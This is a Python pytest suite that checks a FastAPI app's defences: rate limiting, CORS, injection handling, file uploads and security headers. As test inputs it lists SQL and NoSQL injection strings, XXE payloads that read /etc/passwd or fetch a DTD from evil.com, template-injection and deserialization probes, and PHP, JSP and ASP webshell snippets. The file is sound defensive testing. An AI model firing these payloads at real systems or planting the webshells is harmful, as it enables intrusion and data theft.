"""
Security test suite for API endpoints and infrastructure security.
Tests cover rate limiting, CORS, input validation, and common API vulnerabilities.
"""

import pytest
import asyncio
import time
from unittest.mock import Mock, patch, AsyncMock
from fastapi.testclient import TestClient
from fastapi import status
import json
import re

# Mock imports for testing
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from main import app


class TestRateLimitingSecurity:
    """Test suite for rate limiting and DoS protection."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_endpoint_rate_limiting(self):
        """Test that endpoints have proper rate limiting."""
        endpoints_to_test = [
            "/api/v1/auth/login",
            "/api/v1/auth/register", 
            "/api/v1/jobs",
            "/api/v1/health"
        ]
        
        for endpoint in endpoints_to_test:
            # Make rapid requests to test rate limiting
            responses = []
            for i in range(50):  # Adjust based on actual rate limit
                if endpoint == "/api/v1/auth/login":
                    response = self.client.post(endpoint, json={
                        "email": f"test{i}@example.com",
                        "password": "test123"
                    })
                elif endpoint == "/api/v1/auth/register":
                    response = self.client.post(endpoint, json={
                        "email": f"test{i}@example.com",
                        "password": "TestPassword123!",
                        "full_name": "Test User"
                    })
                elif endpoint == "/api/v1/jobs":
                    response = self.client.get(endpoint, headers={
                        "Authorization": "Bearer test_token"
                    })
                else:
                    response = self.client.get(endpoint)
                
                responses.append(response)
                
                # Break if we hit rate limit
                if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                    break
            
            # Verify rate limiting is working
            rate_limited = any(r.status_code == status.HTTP_429_TOO_MANY_REQUESTS for r in responses)
            assert rate_limited, f"Rate limiting not working for {endpoint}"
    
    def test_burst_attack_protection(self):
        """Test protection against burst attacks."""
        # Simulate burst attack - many requests in short time
        start_time = time.time()
        responses = []
        
        for i in range(100):
            response = self.client.post("/api/v1/auth/login", json={
                "email": f"burst{i}@attack.com",
                "password": "attack123"
            })
            responses.append(response)
            
            # Stop if rate limited
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Should be rate limited quickly
        assert duration < 10, "Burst attack not mitigated quickly enough"
        rate_limited = any(r.status_code == status.HTTP_429_TOO_MANY_REQUESTS for r in responses)
        assert rate_limited, "Burst attack not rate limited"
    
    def test_distributed_attack_detection(self):
        """Test detection of distributed attacks."""
        # Simulate requests from different IPs/user agents
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1)",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0)"
        ]
        
        responses = []
        for i, ua in enumerate(user_agents):
            for j in range(20):  # 20 requests per user agent
                response = self.client.post("/api/v1/auth/login", json={
                    "email": f"dist_attack{i}_{j}@example.com",
                    "password": "attack123"
                }, headers={"User-Agent": ua})
                
                responses.append(response)
                
                if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                    break
        
        # Should detect distributed attack patterns
        rate_limited = any(r.status_code == status.HTTP_429_TOO_MANY_REQUESTS for r in responses)
        assert rate_limited, "Distributed attack not detected"


class TestCORSSecurity:
    """Test suite for CORS configuration security."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_cors_origin_validation(self):
        """Test CORS origin validation."""
        # Test allowed origins
        allowed_origins = [
            "http://localhost:3000",
            "https://sparkops.example.com"
        ]
        
        for origin in allowed_origins:
            response = self.client.options(
                "/api/v1/users/me",
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization"
                }
            )
            
            # Should allow allowed origins
            assert response.status_code in [200, 204]
            assert "Access-Control-Allow-Origin" in response.headers
        
        # Test disallowed origins
        disallowed_origins = [
            "http://evil-site.com",
            "https://malicious.example.com",
            "http://localhost:8080"
        ]
        
        for origin in disallowed_origins:
            response = self.client.options(
                "/api/v1/users/me",
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET"
                }
            )
            
            # Should not allow disallowed origins
            if "Access-Control-Allow-Origin" in response.headers:
                allowed = response.headers["Access-Control-Allow-Origin"]
                assert allowed != origin
    
    def test_cors_methods_validation(self):
        """Test CORS allowed methods validation."""
        response = self.client.options(
            "/api/v1/users/me",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "DELETE"
            }
        )
        
        # Should only allow safe methods
        if "Access-Control-Allow-Methods" in response.headers:
            allowed_methods = response.headers["Access-Control-Allow-Methods"]
            dangerous_methods = ["DELETE", "PUT", "PATCH"]
            
            for method in dangerous_methods:
                if method in allowed_methods:
                    # Ensure proper authentication is required
                    pass
    
    def test_cors_headers_validation(self):
        """Test CORS allowed headers validation."""
        response = self.client.options(
            "/api/v1/users/me",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "X-Custom-Header"
            }
        )
        
        # Should not allow arbitrary headers
        if "Access-Control-Allow-Headers" in response.headers:
            allowed_headers = response.headers["Access-Control-Allow-Headers"]
            assert "X-Custom-Header" not in allowed_headers


class TestInputValidationSecurity:
    """Test suite for comprehensive input validation."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_sql_injection_comprehensive(self):
        """Test comprehensive SQL injection prevention."""
        sql_injection_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "admin'--",
            "admin' /*",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "') OR '1'='1 --",
            "') OR ('1'='1 --",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "'; EXEC xp_cmdshell('dir'); --",
            "' EXEC xp_cmdshell('dir'); --",
            "'; DROP TABLE users; --",
            "' DROP TABLE users; --",
            "'; INSERT INTO users VALUES('hacker','password'); --",
            "' UNION SELECT * FROM users --",
            "' UNION SELECT @@version --",
            "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --",
            "'; SHUTDOWN; --",
            "' WAITFOR DELAY '00:00:05' --",
            "1'; WAITFOR DELAY '00:00:05' --"
        ]
        
        for payload in sql_injection_payloads:
            # Test in login endpoint
            response = self.client.post("/api/v1/auth/login", json={
                "email": payload,
                "password": "test"
            })
            
            # Should not succeed or cause server error
            assert response.status_code not in [200, 500]
            
            # Test in search endpoints
            response = self.client.get(
                "/api/v1/jobs?search=" + payload,
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should not cause server error
            assert response.status_code != 500
    
    def test_nosql_injection_prevention(self):
        """Test NoSQL injection prevention."""
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$where": "return true"},
            {"$regex": ".*"},
            {"$or": [{"admin": True}, {"admin": {"$exists": True}}]},
            {"$json": {"$gt": ""}},
            {"$expr": {"$gt": ["$$this", ""]}}
        ]
        
        for payload in nosql_payloads:
            # Test in API endpoints that might use NoSQL
            response = self.client.post(
                "/api/v1/jobs/search",
                json=payload,
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should not cause server error or unauthorized access
            assert response.status_code not in [500, 200]
    
    def test_xml_external_entity_prevention(self):
        """Test XXE (XML External Entity) attack prevention."""
        xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
        ]
        
        for payload in xxe_payloads:
            # Test in any endpoint that accepts XML
            response = self.client.post(
                "/api/v1/import/xml",
                data=payload,
                headers={"Content-Type": "application/xml"}
            )
            
            # Should not allow XXE attacks
            assert response.status_code not in [200, 500]
    
    def test_template_injection_prevention(self):
        """Test template injection prevention."""
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{7*'7'}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${''.__class__.__mro__[2].__subclasses__()}}",
            "#{''.__class__.__mro__[2].__subclasses__()}}"
        ]
        
        for payload in template_payloads:
            # Test in endpoints that might use templates
            response = self.client.post(
                "/api/v1/templates/render",
                json={"template": payload, "data": {}},
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should not allow template injection
            if response.status_code == 200:
                result = response.json()
                rendered = result.get("rendered", "")
                # Should not execute template code
                assert "49" not in rendered  # 7*7 result
                assert "subclasses" not in rendered
    
    def test_deserialization_attack_prevention(self):
        """Test insecure deserialization attack prevention."""
        malicious_payloads = [
            b'{"__reduce__": ["eval", ["__import__(\'os\').system(\'ls\')"]]}',
            b'{"__class__": "__main__.EvilClass"}',
            b'{"__init__": {"__globals__": {"os": {"system": "ls"}}}}'
        ]
        
        for payload in malicious_payloads:
            # Test in endpoints that deserialize data
            response = self.client.post(
                "/api/v1/data/deserialize",
                data=payload,
                headers={"Content-Type": "application/octet-stream"}
            )
            
            # Should not allow insecure deserialization
            assert response.status_code not in [200, 500]


class TestFileUploadSecurity:
    """Test suite for file upload security."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_malicious_file_upload_prevention(self):
        """Test prevention of malicious file uploads."""
        malicious_files = [
            ("malicious.php", "<?php system($_GET['cmd']); ?>"),
            ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("webshell.asp", "<%eval request(\"cmd\")%>"),
            ("exploit.exe", b"MZ\x90\x00"),  # PE header
            ("script.js", "<script>alert('xss')</script>"),
            (".htaccess", "AddType application/x-httpd-php .php"),
            ("config.ini", "[evil]\ncommand=ls"),
            ("backup.sql", "DROP TABLE users;")
        ]
        
        for filename, content in malicious_files:
            files = {"file": (filename, content)}
            
            response = self.client.post(
                "/api/v1/files/upload",
                files=files,
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should reject malicious files
            assert response.status_code == status.HTTP_400_BAD_REQUEST
    
    def test_file_size_limits(self):
        """Test file size upload limits."""
        # Create large file (100MB)
        large_content = b"A" * (100 * 1024 * 1024)
        
        files = {"file": ("large.txt", large_content)}
        
        response = self.client.post(
            "/api/v1/files/upload",
            files=files,
            headers={"Authorization": "Bearer test_token"}
        )
        
        # Should reject large files
        assert response.status_code == status.HTTP_413_REQUEST_ENTITY_TOO_LARGE
    
    def test_file_type_validation(self):
        """Test file type validation."""
        allowed_files = [
            ("document.pdf", b"%PDF-"),
            ("image.jpg", b"\xff\xd8\xff\xe0"),
            ("text.txt", b"Hello, World!")
        ]
        
        for filename, content in allowed_files:
            files = {"file": (filename, content)}
            
            response = self.client.post(
                "/api/v1/files/upload",
                files=files,
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should allow safe files (if endpoint exists)
            if response.status_code == 200:
                continue
        
        # Test disallowed types
        disallowed_files = [
            ("script.py", b"#!/usr/bin/env python"),
            ("executable.sh", b"#!/bin/bash\necho 'hello'"),
            ("config.xml", b"<?xml version='1.0'?><root></root>")
        ]
        
        for filename, content in disallowed_files:
            files = {"file": (filename, content)}
            
            response = self.client.post(
                "/api/v1/files/upload",
                files=files,
                headers={"Authorization": "Bearer test_token"}
            )
            
            # Should reject disallowed file types
            assert response.status_code == status.HTTP_400_BAD_REQUEST


class TestInfrastructureSecurity:
    """Test suite for infrastructure-level security."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_security_headers(self):
        """Test presence of security headers."""
        response = self.client.get("/api/v1/health")
        
        # Check for important security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy"
        ]
        
        for header in security_headers:
            # Some headers might not be present in development
            # This test serves as a reminder to add them in production
            if header in response.headers:
                assert response.headers[header] != ""
    
    def test_information_disclosure_prevention(self):
        """Test prevention of information disclosure."""
        # Test error responses don't leak sensitive information
        endpoints_to_test = [
            "/api/v1/nonexistent",
            "/api/v1/auth/nonexistent",
            "/api/v1/users/999999"
        ]
        
        for endpoint in endpoints_to_test:
            response = self.client.get(endpoint)
            
            if response.status_code >= 400:
                error_content = str(response.content)
                
                # Should not contain sensitive system information
                sensitive_patterns = [
                    r"traceback",
                    r"stack trace",
                    r"internal server error",
                    r"database error",
                    r"sql",
                    r"exception",
                    r"file path",
                    r"line \d+"
                ]
                
                for pattern in sensitive_patterns:
                    matches = re.search(pattern, error_content, re.IGNORECASE)
                    assert not matches, f"Sensitive information leaked: {pattern}"
    
    def test_http_method_security(self):
        """Test HTTP method security."""
        # Test that dangerous methods are properly restricted
        dangerous_methods = ["DELETE", "PUT", "PATCH"]
        
        for method in dangerous_methods:
            response = self.client.request(method, "/api/v1/users/me")
            
            # Should require authentication
            assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_api_versioning_security(self):
        """Test API versioning doesn't expose vulnerabilities."""
        # Test various API versions
        versions = ["v1", "v2", "v3"]
        
        for version in versions:
            response = self.client.get(f"/api/{version}/health")
            
            # Should handle versioning securely
            if response.status_code != 404:
                assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
